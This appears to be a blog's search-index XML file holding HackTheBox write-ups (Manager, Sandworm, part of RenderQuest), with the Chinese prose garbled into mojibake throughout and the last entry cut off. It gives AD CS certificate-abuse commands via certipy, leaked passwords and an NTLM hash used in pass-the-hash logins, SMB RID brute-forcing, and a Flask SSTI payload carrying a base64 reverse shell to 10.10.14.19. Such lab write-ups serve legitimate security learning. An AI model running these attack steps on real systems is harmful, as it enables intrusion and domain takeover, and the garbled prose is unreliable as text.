<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox Manager WriteUP</title>
      <link href="/2023/10/30/HackTheBox-Manager-WriteUP/"/>
      <url>/2023/10/30/HackTheBox-Manager-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-21.png" alt="logo"></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><h3 id="Get-User"><a href="#Get-User" class="headerlink" title="Get User"></a>Get User</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/2023-10-24-14-10-00-image.png"></p><h4 id="åŸŸåæšä¸¾"><a href="#åŸŸåæšä¸¾" class="headerlink" title="åŸŸåæšä¸¾"></a>åŸŸåæšä¸¾</h4><p>å› ä¸ºå¼€ç€DNSæœåŠ¡ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å…ˆæ”¶é›†ä¸€æ³¢å­åŸŸåï¼š</p><pre><code class="shell">dnsenum --dnsserver 10.10.11.236 --enum -p 0 -s 0 -o ~/HackTheBox/Manager/subdomain.txt -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt manager.htb</code></pre><p>è·å–åˆ°ä¸»æœºåï¼š<code>dc01.manager.htb</code></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/2023-10-24-14-15-17-image.png"></p><h4 id="SMBç”¨æˆ·åæšä¸¾-å¼±å£ä»¤"><a href="#SMBç”¨æˆ·åæšä¸¾-å¼±å£ä»¤" class="headerlink" title="SMBç”¨æˆ·åæšä¸¾&#x2F;å¼±å£ä»¤"></a>SMBç”¨æˆ·åæšä¸¾&#x2F;å¼±å£ä»¤</h4><pre><code>crackmapexec smb manager.htb -u &quot;anonymous&quot; -p &quot;&quot; --rid-brute</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-1.png" alt="Alt text"></p><p><code>operator</code>è´¦æˆ·å­˜åœ¨å¼±å£ä»¤ï¼š</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-2.png" alt="operator"></p><h4 id="MSSQLå¼±å£ä»¤"><a href="#MSSQLå¼±å£ä»¤" class="headerlink" title="MSSQLå¼±å£ä»¤"></a>MSSQLå¼±å£ä»¤</h4><p>ä½¿ç”¨æ­¤å¯†ç å°è¯•ç™»å½•å…¶ä»–æœåŠ¡ï¼Œç™»å½•MSSQLæˆåŠŸï¼š</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-3.png" alt="Alt text"></p><p>è¯»å–ç³»ç»Ÿç›®å½•ï¼Œå‘ç°ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼š</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-6.png" alt="Alt text"></p><h4 id="Webå¤‡ä»½æ–‡ä»¶"><a href="#Webå¤‡ä»½æ–‡ä»¶" class="headerlink" title="Webå¤‡ä»½æ–‡ä»¶"></a>Webå¤‡ä»½æ–‡ä»¶</h4><p>å®¡è®¡ç½‘ç«™æºç ï¼Œå‘ç°é…ç½®æ–‡ä»¶ä¸­çš„è´¦å·å¯†ç ï¼š</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-8.png" alt=".old-conf"></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ldap-conf xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;   &lt;server&gt;      &lt;host&gt;dc01.manager.htb&lt;/host&gt;      &lt;open-port enabled=&quot;true&quot;&gt;389&lt;/open-port&gt;      &lt;secure-port enabled=&quot;false&quot;&gt;0&lt;/secure-port&gt;      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;      &lt;server-type&gt;microsoft&lt;/server-type&gt;      &lt;access-user&gt;         &lt;user&gt;raven@manager.htb&lt;/user&gt;         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;      &lt;/access-user&gt;      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;   &lt;/server&gt;   &lt;search type=&quot;full&quot;&gt;      &lt;dir-list&gt;         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;      &lt;/dir-list&gt;   &lt;/search&gt;&lt;/ldap-conf&gt;</code></pre><p>ä½¿ç”¨æ­¤<code>evil-winrm</code>ç™»å½•ï¼Œè·å¾—user.txtï¼š</p><pre><code>$ evil-winrm -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -i manager.htb</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-9.png" alt="Alt text"></p><h3 id="Get-Root"><a href="#Get-Root" class="headerlink" title="Get Root"></a>Get Root</h3><h4 id="æ”¶é›†ç”¨æˆ·å"><a href="#æ”¶é›†ç”¨æˆ·å" class="headerlink" title="æ”¶é›†ç”¨æˆ·å"></a>æ”¶é›†ç”¨æˆ·å</h4><p>Ravenç”¨æˆ·ä¸‹å¯ä»¥çœ‹åˆ°å®Œæ•´çš„ç”¨æˆ·åˆ—è¡¨ï¼ˆcrackmapexecé»˜è®¤åªéå†RID1-4000çš„è´¦æˆ·ï¼‰ï¼š</p><pre><code>*Evil-WinRM* PS C:\Users\Raven\Documents&gt; Get-LocalUserName          Enabled Description----          ------- -----------Administrator True    Built-in account for administering the computer/domainGuest         True    Built-in account for guest access to the computer/domainkrbtgt        False   Key Distribution Center Service AccountZhong         TrueCheng         TrueRyan          TrueRaven         TrueJinWoo        TrueChinHae       TrueOperator      True</code></pre><p>æŸ¥çœ‹æ˜¯å¦æœ‰AD CSæœåŠ¡ï¼Œæ£€æŸ¥åˆ°CA Name:<code>manager-DC01-CA</code></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-11.png" alt="Alt text"></p><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>åˆ©ç”¨è¯ä¹¦é…ç½®é”™è¯¯ï¼Œå°†ravenæå‡ä¸º<code>officer</code>(Certificate Manager):</p><pre><code>certipy-ad ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -add-officer raven -ca &#39;manager-DC01-CA&#39;</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-12.png" alt="Alt text"></p><p>å¯ä»¥ä½¿ç”¨ <code>-enable-template</code> å‚æ•°åœ¨ CA ä¸Šå¯ç”¨ <code>SubCA</code> æ¨¡æ¿ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>SubCA</code> æ¨¡æ¿å·²å¯ç”¨ã€‚</p><pre><code>certipy-ad ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39;</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-13.png" alt="Alt text"></p><p>ç¡®è®¤ä¸€ä¸‹<code>SubCA</code>æ¨¡æ¿æˆåŠŸå¯ç”¨äº†</p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-14.png" alt="list"></p><p>è¯·æ±‚åŸºäº SubCA æ¨¡æ¿çš„è¯ä¹¦ï¼Œè®°å½•ä¸‹<code>request ID</code>ï¼š</p><pre><code>certipy-ad req -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -template SubCA -upn administrator@manager.htb -target manager.htb</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-15.png" alt="Alt text"></p><p>ä½¿ç”¨ <code>ca</code> å‘½ä»¤å’Œå‚æ•°å‘å‡ºå¤±è´¥çš„ <code>-issue-request &lt;request ID&gt;</code> è¯ä¹¦è¯·æ±‚ï¼Œç„¶åä½¿ç”¨ req å‘½ä»¤å’Œå‚æ•°æ£€ç´¢é¢å‘çš„ -retrieve <request ID> è¯ä¹¦ï¼š</p><pre><code>$ certipy-ad ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -issue-request 45 $ certipy-ad req -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target manager.htb -retrieve 45</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-16.png" alt="Alt text"></p><p>éªŒè¯è¯ä¹¦ï¼Œæå–å“ˆå¸Œï¼š</p><pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb -username administrator</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-17.png" alt="Alt text"></p><p>åˆ©ç”¨hashç™»å½•administratorè´¦æˆ·ï¼Œè·å¾—root.txt</p><pre><code>evil-winrm -u administrator -H ae5064c2f62317332c88629e025924ef -i manager.htb</code></pre><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-18.png" alt="Alt text"></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-20.png" alt="Alt text"></p><p><img src="/2023/10/30/HackTheBox-Manager-WriteUP/image-19.png" alt="Alt text"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å‰å‰ååå¿™æ´»äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œåœ¨èµ›å­£ç»“æŸä¹‹å‰æŠŠflagæäº¤äº†ã€‚ä¸­é—´å¡ä½å¾ˆå¤šæ¬¡ï¼Œæ¯”å¦‚çˆ†ç ´è´¦å·å¯†ç çš„æ—¶å€™ç›´æ¥ç”¨äº†å­—å…¸ï¼Œæ²¡æœ‰æƒ³åˆ°æŠŠç”¨æˆ·ååŠ åˆ°å¯†ç è¡¨ä¸­ã€‚ä»¥åŠåç»­ææƒï¼ŒåŸºæœ¬æ˜¯æŠŠæ‰€æœ‰æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œå¯¹ç…§ç½‘ä¸ŠæŸ¥åˆ°çš„èµ„æ–™ï¼Œä¸€æ ·ä¸€æ ·çš„å°è¯•ï¼ˆæ‰€ä»¥å®Œæ•´çš„wpå†™äº†700å¤šè¡Œâ€¦â€¦ï¼‰ï¼Œæœ€åæ‰rootã€‚</p><p>æ”¶è·é¢‡ä¸°ï¼Œæ”¶è·é¢‡ä¸°ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> AD CS </tag>
            
            <tag> åŸŸæ¸—é€ </tag>
            
            <tag> æš´åŠ›ç ´è§£ </tag>
            
            <tag> å¼±å£ä»¤ </tag>
            
            <tag> SMB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Sandworm WriteUP</title>
      <link href="/2023/10/23/HackTheBox-Sandworm-WriteUP/"/>
      <url>/2023/10/23/HackTheBox-Sandworm-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image.png" alt="Logo"></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>é¢˜ç›®ç»™äº†IPï¼Œå…ˆç«¯å£æ‰«æï¼š</p><pre><code>rustscan -r 1-65535 -b 924 -t 2000 -a 10.10.11.218</code></pre><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-1.png" alt="rustscan"></p><p>WebæœåŠ¡è®¿é—®ä¸€ä¸‹ï¼Œç›´æ¥è·³è½¬åˆ°äº†<code>ssa.htb</code>ã€‚<br>é…ç½®å¥½hostsæ–‡ä»¶ä¹‹åä¸Šnmapå†ä»”ç»†æ‰«ä¸€éï¼š</p><pre><code>echo &quot;10.10.11.218 ssa.htb&quot; &gt;&gt; /etc/hostsnmap -p 22,80,443 -A -v -Pn --open --script auth,vuln ssa.htb</code></pre><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-2.png" alt="nmap"></p><p>å¹¶æ²¡æœ‰æ‰¾åˆ°æ›´å¤šæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><pre><code class="bash">ffuf -u https://ssa.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -v -r</code></pre><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-3.png" alt="dir1"><br><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-4.png" alt="dir2"></p><p>å…¶ä¸­<code>contact</code>æ˜¯ä¸€ä¸ªæäº¤PGPåŠ å¯†ä¿¡æ¯çš„ç•Œé¢ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-5.png" alt="contact"></p><p><code>guide</code>æ˜¯ä¸€ä¸ªæŒ‡å¯¼PGPåŠ å¯†çš„ç•Œé¢ï¼ŒåŒ…å«åŠ å¯†ã€è§£å¯†å’ŒéªŒè¯ç­‰åŠŸèƒ½ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-6.png" alt="guide"></p><p>ç½‘ç«™åº•éƒ¨æœ‰<code>Powered by Flaskâ„¢ </code>å­—æ ·ï¼Œçœ‹åˆ°è¿™ä¸ªç¬¬ä¸€ååº”åº”è¯¥å°±æ˜¯ç”¨SSTIæ¼æ´æ¥æ‰“äº†ã€‚</p><h3 id="æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰"><a href="#æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰" class="headerlink" title="æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰"></a>æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰</h3><p>å’ŒXSSä¸€æ ·ï¼Œæ‰¾SSTIçš„æ³¨å…¥ç‚¹ï¼Œé¦–å…ˆåº”è¯¥æ‰¾èƒ½å¤ŸæŠŠæˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯å®Œæ•´å›æ˜¾çš„åœ°æ–¹ã€‚è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°äº†<code>guide</code>é¡µé¢çš„<code>Verify Signature</code>åŠŸèƒ½ï¼Œå®ƒèƒ½è¿”å›æˆ‘ä»¬ç­¾åpgpæ—¶ä½¿ç”¨çš„ç”¨æˆ·åï¼ˆè¿™é‡Œå¿˜è®°æˆªå›¾äº†ï¼‰ï¼Œç®€å•<code>&#123;&#123;9*9&#125;&#125;</code>éªŒè¯åè¯å®å­˜åœ¨SSTIæ¼æ´ã€‚</p><p>åç»­åå¼¹Shellåˆ©ç”¨çš„Payloadå¦‚ä¸‹ï¼š</p><pre><code>&#123;&#123; self.__init__.__globals__.__builtins__.__import__('os').popen('echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvOTExIDA+JjE="|base64 -d|bash').read() &#125;&#125;</code></pre><p>é¦–å…ˆæˆ‘ä»¬åœ¨åœ¨çº¿ç½‘ç«™ï¼ˆ<a href="https://pgptool.org/">PGP Tool</a>ï¼‰ç”ŸæˆPGPå¯†é’¥å¯¹ï¼Œåœ¨ç”¨æˆ·åå¤„é”®å…¥Payloadï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-7.png" alt="generate"></p><p>ç„¶åç”Ÿæˆç­¾åä¿¡æ¯ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-8.png" alt="sign"></p><p>å°†å…¬é’¥å’Œç­¾åä¿¡æ¯ä¸¢åˆ°ç½‘ç«™ä¸­éªŒè¯ï¼ŒæˆåŠŸåå¼¹Shellï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-9.png" alt="reverseshell"></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å½“å‰ç”¨æˆ·ç›®å½•ä¸‹æ˜¯æ²¡æœ‰user.txtçš„ã€‚æˆ‘ä»¬åœ¨ç¿»çœ‹äº†é…ç½®æ–‡ä»¶åï¼Œåœ¨<code>/home/atlas/.config/httpie/sessions/localhost_5000/admin.json</code>ä¸­å‘ç°äº†ç”¨æˆ·<code>silentobserver</code>çš„è´¦å·å¯†ç ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-10.png" alt="admin.json"></p><p>æ­¤ç”¨æˆ·èƒ½å¤Ÿåœ¨<code>login</code>é¡µé¢ç›´æ¥ç™»å½•ï¼Œä¹Ÿèƒ½ç›´æ¥sshç™»å½•åˆ°ç›®æ ‡ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-11.png" alt="login"></p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-12.png" alt="ssh-1"></p><p>&lt;!â€“&gt;quietLiketheWind22&lt;!â€“&gt;</p><p>æ‰§è¡Œpspy64çœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªatlasç”¨æˆ·æƒé™æ‰§è¡Œçš„å®šæ—¶ä»»åŠ¡ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-13.png" alt="pspy"></p><p>ç®€åŒ–ä¸€ä¸‹ï¼Œç„¶åé—®ä¸€ä¸‹ChatGPTè¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼š</p><blockquote><p>è¿™ä¸ªå‘½ä»¤æ˜¯ä¸€ä¸ªç»“åˆäº† <code>echo</code> å’Œ <code>cargo</code> çš„ shell å‘½ä»¤ã€‚æˆ‘ä»¬æ¥é€éƒ¨åˆ†è§£è¿™ä¸ªå‘½ä»¤ï¼š</p><ol><li><p><strong><code>echo &quot;e&quot;</code></strong>: è¿™æ˜¯ä¸€ä¸ª shell å‘½ä»¤ï¼Œç”¨äºè¾“å‡º â€œeâ€ è¿™ä¸ªå­—ç¬¦ã€‚</p></li><li><p><strong><code>|</code></strong>: è¿™æ˜¯ä¸€ä¸ªç®¡é“ç¬¦å·ã€‚åœ¨ shell ä¸­ï¼Œç®¡é“ç”¨äºå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œå®ƒå°† â€œeâ€ è¿™ä¸ªå­—ç¬¦ä¼ é€’ç»™äº† <code>cargo run --offline</code> å‘½ä»¤ã€‚</p></li><li><p><strong><code>cargo run --offline</code></strong>: è¿™æ˜¯ Cargo çš„ä¸€ä¸ªå‘½ä»¤ã€‚</p><ul><li><strong><code>cargo run</code></strong>: è¿™æ˜¯ Cargo çš„ä¸€ä¸ªå‘½ä»¤ï¼Œå®ƒç¼–è¯‘å¹¶è¿è¡ŒæŒ‡å®šçš„ Rust é¡¹ç›®ã€‚</li><li><strong><code>--offline</code></strong>: è¿™ä¸ªæ ‡å¿—å‘Šè¯‰ Cargo åœ¨ç¦»çº¿æ¨¡å¼ä¸‹è¿è¡Œï¼Œè¿™æ„å‘³ç€å®ƒä¸ä¼šå°è¯•è”ç½‘æ›´æ–° crate æˆ–è§£å†³ä¾èµ–ã€‚å®ƒä¼šä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„ä¾èµ–ç‰ˆæœ¬ã€‚</li></ul></li></ol><p>ç»¼åˆæ¥çœ‹ï¼Œ<code>echo &quot;e&quot;|cargo run --offline</code> çš„æ„æ€æ˜¯ï¼šè¾“å‡º â€œeâ€ è¿™ä¸ªå­—ç¬¦ï¼Œå¹¶å°†è¿™ä¸ªå­—ç¬¦ä½œä¸ºè¾“å…¥ä¼ é€’ç»™ <code>cargo run --offline</code>ã€‚è¿™é€šå¸¸æ˜¯ä¸ºäº†å‘ Rust ç¨‹åºæä¾›ä¸€äº›é¢„æœŸçš„è¾“å…¥ï¼Œä¾‹å¦‚å½“ Rust ç¨‹åºæœŸæœ›ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–æ•°æ®æ—¶ã€‚</p></blockquote><p>æˆ‘ä»¬åœ¨å…ˆå‰è·å¾—çš„ç¬¬ä¸€ä¸ªShellï¼Œç”¨æˆ·æƒé™å°±æ˜¯<code>atlas</code>ï¼Œä½†é‚£å®é™…ä¸Šå¤§æ¦‚ç‡åªæ˜¯ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-16.png" alt="sandbox"></p><p>æ‰€ä»¥æˆ‘ä»¬ä¹Ÿè®¸éœ€è¦å†æ¬¡è·å¾—atlasç”¨æˆ·çš„çœŸå®æƒé™ã€‚ç»“åˆcargoçš„è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¿®æ”¹rustç¨‹åºçš„æºç ï¼Œå°±å¯ä»¥å®ç°åå¼¹Shellã€‚ä½†æ˜¯å¾ˆé—æ†¾ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰srcç›®å½•çš„å†™å…¥æƒé™ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-15.png" alt="src"></p><p>ç»§ç»­ç¿»ç›®å½•ï¼Œæˆ‘ä»¬æœ‰<code>/opt/crates/logger/src/lib.rs</code>çš„å†™å…¥æƒé™ï¼Œè€Œ<code>tipnet</code>åˆšå¥½ä¼šè°ƒç”¨loggerçš„å‡½æ•°ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-17.png" alt="lib.rs"></p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-18.png" alt="logger"></p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¿®æ”¹<code>lib.rs</code>çš„æºç å°±å¯ä»¥äº†ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-19.png" alt="reverse-shell"></p><p>è·å¾—<code>atlas</code>ç”¨æˆ·çš„shellä¹‹åï¼Œå¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·ä¸‹æ­£åœ¨è¿è¡Œfirejailï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-20.png" alt="firejail"></p><p>æˆ‘ä»¬æœ€åˆè·å¾—çš„Shellï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸ªæ²™ç®±çš„ç¯å¢ƒï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-21.png" alt="chatgpt"></p><p><code>firejail</code>å­˜åœ¨å…¬å¼€çš„æ¼æ´ï¼Œæˆ‘ä»¬ç›´æ¥æ‰¾åˆ°expåˆ©ç”¨å°±å¥½ï¼š</p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-23.png" alt="root"></p><p><img src="/2023/10/23/HackTheBox-Sandworm-WriteUP/image-24.png" alt="Pwn"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>é™¤äº†SSTIä¹‹å‰åšè¿‡ç±»ä¼¼çš„challengeä¹‹å¤–ï¼Œå…¶ä»–å‡ ä¹æ‰€æœ‰çŸ¥è¯†ç‚¹éƒ½è¦ç°å­¦ã€‚å†æ¬¡æ„è¯†åˆ°ï¼Œå¯¹äºå®‰å…¨äººå‘˜æ¥è¯´ï¼Œç°å­¦ç°å–çœŸæ˜¯ä¸€æ ·éå¸¸é‡è¦çš„èƒ½åŠ›ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox RenderQuest WriteUP</title>
      <link href="/2023/09/25/HackTheBox-RenderQuest-WriteUP/"/>
      <url>/2023/09/25/HackTheBox-RenderQuest-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>Youâ€™ve found a website that lets you input remote templates for rendering. Your task is to exploit this systemâ€™s vulnerabilities to access and retrieve a hidden flag. Good luck!</p></blockquote><p>ç¿»è¯‘ï¼šæ‚¨å‘ç°äº†ä¸€ä¸ªå¯ä»¥è¾“å…¥è¿œç¨‹æ¨¡æ¿è¿›è¡Œæ¸²æŸ“çš„ç½‘ç«™ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯åˆ©ç”¨è¯¥ç³»ç»Ÿçš„æ¼æ´è®¿é—®å’Œæ£€ç´¢ä¸€ä¸ªéšè—æ ‡å¿—ã€‚ç¥ä½ å¥½è¿ï¼</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image.png" alt="challenge"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ ¹æ®æè¿°ï¼Œç½‘ç«™çš„åŠŸèƒ½æ˜¯è®©æˆ‘ä»¬æä¾›ä¸€ä¸ªè¿œç¨‹çš„æ¨¡æ¿ï¼Œç½‘ç«™å¯¹æˆ‘ä»¬çš„æ¨¡æ¿è¿›è¡Œæ¸²æŸ“ã€‚è¿œç¨‹ç«™ç‚¹æˆ‘ä»¬å¯ä»¥ç”¨GitHubPagesï¼Œå¯æ˜¯æˆ‘ä¸ä¼šå†™Golangçš„æ¨¡æ¿ï¼Œç»“é¢˜å¤±è´¥ï¼Œæ­¤è´´ç»“æŸã€‚</p><p>å’³å’³ã€‚</p><p>æˆ‘ä¸ä¼šå†™ï¼Œè®©ChatGPTå†™ä¸€ä¸ªä¸å°±å®Œäº†ã€‚å…ˆå†™ä¸€ä¸ªæ™®é€šçš„çœ‹çœ‹é•¿ä»€ä¹ˆæ ·ï¼š</p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Client &amp; Server Info&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;Client Information&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Client IP: &#123;&#123;.ClientIP&#125;&#125;&lt;/li&gt;        &lt;li&gt;User Agent: &#123;&#123;.ClientUA&#125;&#125;&lt;/li&gt;        &#123;&#123;with .ClientIpInfo&#125;&#125;            &lt;li&gt;IP Version: &#123;&#123;.IpVersion&#125;&#125;&lt;/li&gt;            &lt;li&gt;IP Address: &#123;&#123;.IpAddress&#125;&#125;&lt;/li&gt;            &lt;li&gt;Latitude: &#123;&#123;.Latitude&#125;&#125;&lt;/li&gt;            &lt;li&gt;Longitude: &#123;&#123;.Longitude&#125;&#125;&lt;/li&gt;            &lt;li&gt;Country Name: &#123;&#123;.CountryName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Country Code: &#123;&#123;.CountryCode&#125;&#125;&lt;/li&gt;            &lt;li&gt;Time Zone: &#123;&#123;.TimeZone&#125;&#125;&lt;/li&gt;            &lt;li&gt;Zip Code: &#123;&#123;.ZipCode&#125;&#125;&lt;/li&gt;            &lt;li&gt;City Name: &#123;&#123;.CityName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Region Name: &#123;&#123;.RegionName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Continent: &#123;&#123;.Continent&#125;&#125;&lt;/li&gt;            &lt;li&gt;Continent Code: &#123;&#123;.ContinentCode&#125;&#125;&lt;/li&gt;        &#123;&#123;end&#125;&#125;    &lt;/ul&gt;    &lt;h2&gt;Server Information&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Hostname: &#123;&#123;.ServerInfo.Hostname&#125;&#125;&lt;/li&gt;        &lt;li&gt;Operating System: &#123;&#123;.ServerInfo.OS&#125;&#125;&lt;/li&gt;        &lt;li&gt;Kernel Version: &#123;&#123;.ServerInfo.KernelVersion&#125;&#125;&lt;/li&gt;        &lt;li&gt;Memory: &#123;&#123;.ServerInfo.Memory&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ä¸¢ç»™ç½‘ç«™çœ‹çœ‹æ•ˆæœï¼š</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-1.png" 